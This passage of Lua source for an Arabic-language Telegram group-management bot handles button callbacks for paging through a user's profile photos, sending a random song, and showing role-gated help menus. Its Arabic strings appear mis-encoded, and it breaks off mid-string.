ttt = ' Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨͺΩΩ \n ('..monsh..''..cr..''..owner..''..momod..''..vipmem..' ) \n'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(ttt)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else 
tyt = "Ω­ ΩΩΨ³ ΩΨ―ΩΩ Ψ§Ω Ψ±ΨͺΨ¨Ω ΩΩΨ§ "
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tyt)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end end end
if Text and Text:match('(.*)/ganyy') then
if tonumber(Text:match('(.*)/ganyy')) == tonumber(data.sender_user_id_) then
Text = 'Ψ§ΩΩΩ Ψ§ΨΊΩΩΩ ΨΉΨ΄ΩΨ§Ψ¦ΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΊΩΩΩ Ψ§Ψ?Ψ±Ω',callback_data=msg.sender_user_id_.."/ganyy"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendAudio?chat_id=' .. Chat_id .. '&audio=https://t.me/mmsst13/'..Rrr..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if Text and Text:match('(.*)/sorty2') then
if tonumber(Text:match('(.*)/sorty2')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 3},function(extra,mahmoud,success)
if mahmoud.photos_[1] then
local ph = mahmoud.photos_[1].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s3orty"},{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨ³Ψ§Ψ¨ΩΩ', callback_data=data.sender_user_id_.."/s1orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id,0,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω ')
end end,nil)
end end
if Text and Text:match('(.*)/s1orty') then
if tonumber(Text:match('(.*)/s1orty')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success)
if mahmoud.photos_[0] then
local ph = mahmoud.photos_[0].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s3orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω")
end end,nil)
end end
if Text and Text:match('(.*)/s3orty') then
if tonumber(Text:match('(.*)/s3orty')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 3},function(extra,mahmoud,success)
if mahmoud.photos_[2] then
local ph = mahmoud.photos_[2].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s4orty"},{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨ³Ψ§Ψ¨ΩΩ', callback_data=data.sender_user_id_.."/s2orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω")
end end,nil)
end end
if Text and Text:match('(.*)/s4orty') then
if tonumber(Text:match('(.*)/s4orty')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 4},function(extra,mahmoud,success)
if mahmoud.photos_[3] then
local ph = mahmoud.photos_[3].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s5orty"},{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨ³Ψ§Ψ¨ΩΩ', callback_data=data.sender_user_id_.."/s4orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω")
end end,nil)
end end
if Text and Text:match('(.*)/s5orty') then
if tonumber(Text:match('(.*)/s5orty')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 5},function(extra,mahmoud,success)
if mahmoud.photos_[4] then
local ph = mahmoud.photos_[4].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s6orty"},{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨ³Ψ§Ψ¨ΩΩ', callback_data=data.sender_user_id_.."/s5orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω")
end end,nil)
end end
if Text and Text:match('(.*)/s6orty') then
if tonumber(Text:match('(.*)/s6orty')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 6},function(extra,mahmoud,success)
if mahmoud.photos_[5] then
local ph = mahmoud.photos_[5].sizes_[1].photo_.persistent_id_
local Teext = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=data.sender_user_id_.."/s7orty"},{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨ³Ψ§Ψ¨ΩΩ', callback_data=data.sender_user_id_.."/s6orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ± Ψ§Ψ?Ψ±Ω")
end end,nil)
end end
if Text and Text:match('(.*)/s7orty') then
if tonumber(Text:match('(.*)/s7orty')) == tonumber(data.sender_user_id_) then
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0,'οΈΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΩΩΩΩΩΩ Ψ¬ΩΨ¨ Ψ§ΩΨ«Ψ± ΩΩ 5 Ψ΅ΩΨ± ')
end end
if Text and Text:match('(.*)/help1') and Admin(mahh) then
if tonumber(Text:match('(.*)/help1')) == tonumber(data.sender_user_id_) then

local Tww =[[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ
β β β β β β β β β
Ω­ ΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω 
Ω­ ΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΩΨ― β’ Ψ¨Ψ§ΩΨ·Ψ±Ψ― β’ Ψ¨Ψ§ΩΩΨͺΩ
β β β β β β β β β
Ω­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·
Ω­ Ψ§ΩΩΨΉΨ±Ω
Ω­ Ψ§ΩΨͺΨ§Ω
Ω­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω
Ω­ Ψ§ΩΨͺΨΉΨ―ΩΩ
Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ
Ω­ Ψ§ΩΩΩΩΨ§Ψͺ
Ω­ Ψ§ΩΨ΅ΩΨ±

Ω­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ
Ω­ Ψ§ΩΩΩΨ―ΩΩ
Ω­ Ψ§ΩΨ§ΩΩΨ§ΩΩ
Ω­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω
Ω­ Ψ§ΩΨͺΩΨ¬ΩΩ
Ω­ Ψ§ΩΨ§ΨΊΨ§ΩΩ
Ω­ Ψ§ΩΨ΅ΩΨͺ
Ω­ Ψ§ΩΨ¬ΩΨ§Ψͺ
Ω­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ

Ω­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ
Ω­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Ω­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±
Ω­ Ψ§ΩΩΩΨ§ΩΨ΄
Ω­ Ψ§ΩΨ³ΩΩΩΩ
β β β β β β β β β

[source revor](t.me/Revorb0t)β’
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help2') and Admin(mahh) then
if tonumber(Text:match('(.*)/help2')) == tonumber(data.sender_user_id_) then

local Tww =[[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΩΨ²
Ω­ ΨͺΨ§Ω ΩΩΩΩ
Ω­ ΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨
Ω­ ΩΨͺΩ
Ω­ Ψ­ΨΈΨ±
Ω­ Ψ·Ψ±Ψ―
Ω­ ΩΩΨΉ
Ω­ ΨͺΩΩΩΨ―
Ω­ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ
Ω­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ
Ω­ Ψ§ΩΩΩΨͺΩΩΩΩ
Ω­ Ψ§ΩΩΩΩΨ²ΩΩ
Ω­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ

Ω­ ΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ

Ω­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
Ω­ Ψ§ΩΩΩΨ§ΩΩΩ

Ω­ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
Ω­ Ψ§ΨΆΩ /ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ 
Ω­ ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± + Ψ§ΩΨΉΨ―Ψ―
Ω­ Ψ§ΩΨ―Ω
Ω­ Ψ¬ΩΨ§ΨͺΩ
Ω­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ
Ω­ Ψ±Ψ³Ψ§Ψ¦ΩΩ
Ω­ ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
β β β β β β β β β
Ω­ ΩΨΆΨΉ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
β β β β β β β β β
Ω­ Ψ§Ψ³Ω
Ω­ Ψ±Ψ§Ψ¨Ψ·
Ω­ Ψ΅ΩΨ±Ω
Ω­ ΩΨ΅Ω
Ω­ ΩΩΨ§ΩΩΩ
Ω­ ΨͺΨ±Ψ­ΩΨ¨
β β β β β β β β β
Ω­ ΩΨ³Ψ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
β β β β β β β β β
Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
Ω­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ
Ω­ Ψ§ΩΩΩΩΨ²ΩΩ
Ω­ Ψ§ΩΩΩΨͺΩΩΩΩ
Ω­ Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ
Ω­ Ψ§ΩΩΩΨ§ΩΩΩ
Ω­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Ω­ Ψ§ΩΨ΅ΩΨ±Ω
Ω­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
Ω­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help3') and OwnerSs(mahh) then
if tonumber(Text:match('(.*)/help3')) == tonumber(data.sender_user_id_) then

local Tww =[[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ
Ω­ Ψ±ΩΨΉ/ΩΨ΄Ω Ψ§ΩΩΩΩΨ―
Ω­ ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ

Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΉΨ¨Ω/Ψ§ΩΨ§ΩΨΉΨ§Ψ¨
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΨ·Ψ±Ψ―
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·/Ψ¬ΩΨ¨ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄

Ω­ ΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω

Ω­ Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ―
Ω­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ Ψ§ΩΨ±Ψ―ΩΨ―

Ω­ ΨͺΩΨΈΩΩ + ΨΉΨ―Ψ―
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ―
β β β β β β β β β
Ω­ ΩΨͺΨΊΩΨ± Ψ±Ψ―ΩΨ― Ψ§ΩΨ§ΩΨ―Ω :- 
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ + Ψ§ΩΩΨ΅
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help4') and Creator(mahh) then
if tonumber(Text:match('(.*)/help4')) == tonumber(data.sender_user_id_) then

local Tww =[[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦
Ω­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ

Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±
Ω­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Ω­ ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Ω­ ΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ§ΩΨ±
Ω­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
Ω­ Ψ­Ψ°Ω/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
Ω­ Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
Ω­ Ψ§ΨΆΩ ΩΩΨ§Ψ· + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help5') and DevBot(mahh) then
if tonumber(Text:match('(.*)/help5')) == tonumber(data.sender_user_id_) then

local Tww = 'Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \nβ β β β β β β β β\nΩ­ Ψ­ΨΈΨ± ΨΉΨ§Ω\nΩ­ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω\nΩ­ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω\nΩ­ ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ\nΩ­ Ψ±ΩΨΉ /ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± \nΩ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ\nΩ­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω \nΩ­ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ\nΩ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ \nΩ­ ΩΨΆΨΉ /Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ± \nΩ­ ΨͺΨ­Ψ―ΩΨ« + ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ \n\nΩ­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ \nΩ­ ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ + Ψ§ΩΨΉΨ―Ψ―\nΩ­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ψ©\nΩ­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ \nΩ­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ ΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΩΩ\nΩ­ Ψ§ΩΩΩΩΨ§Ψͺ \nΩ­ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ \nΩ­ Ψ§ΩΩΨͺΨ¬Ψ± \nΩ­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± \nβ β β β β β β β β\nΩ­ ΨͺΩΨΉΩΩ /ΨͺΨΉΨ·ΩΩ\n\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω\nΩ­ Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ \nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ\nΩ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ \nΩ­ ΨΊΨ§Ψ―Ψ± \nΩ­ ΨΊΨ§Ψ―Ψ± + 